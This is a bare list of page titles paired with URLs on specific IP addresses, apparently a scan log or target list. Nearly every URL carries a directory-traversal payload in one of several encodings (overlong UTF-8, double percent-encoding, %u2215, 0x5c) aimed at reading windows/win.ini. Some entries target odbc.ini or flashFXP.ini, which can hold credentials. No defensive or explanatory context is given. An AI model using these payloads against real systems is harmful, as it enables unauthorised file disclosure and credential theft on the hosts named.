Index.of,http://210.203.16.182/login_admin/seccoes.php/..%2525c0%2525af..%2525c0%2525af..%2525c0%2525af..%2525c0%2525af..%2525c0%2525af..%2525c0%2525af..%2525c0%2525af..%2525c0%2525af/windows/win.ini
start.managing.the.device - web,http://210.63.253.136/wp-content/cache/comments//%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255cwindows/win.ini
EXTRANET,http://210.202.233.151/login_out/m2f/Pageid%3D999999.9%2520/................windows/win.ini
Remote Desktop Web Connection,http://210.202.233.156/login1/GM.cgi/%2525u2215..%2525u2215..%2525u2215..%2525u2215..%2525u2215..%2525u2215..%2525u2215..%2525u2215windows/win.ini
babin.nelly.free.fr/wwblock.ini,http://babin.nelly.free.fr/wwblock.ini
MailMan,http://222.156.247.157/login/tdbin/admin/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows/win.ini
"\""PHP",http://222.156.247.136/login-us/1220/cgi-bin//..%25252f..%25252f..%25252f..%25252f..%25252f..%25252f..%25252f..%25252fwindows/win.ini
oMail-admin - Error Occurred While,http://210.242.145.167/login/.r%257B%257D_vti_cnf/utilities/odbc.ini
WebLogic,http://210.242.146.175/loginsuper//%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255cwindows/win.ini
VisNetic,http://210.242.147.168/comments/view/search/flashFXP.ini
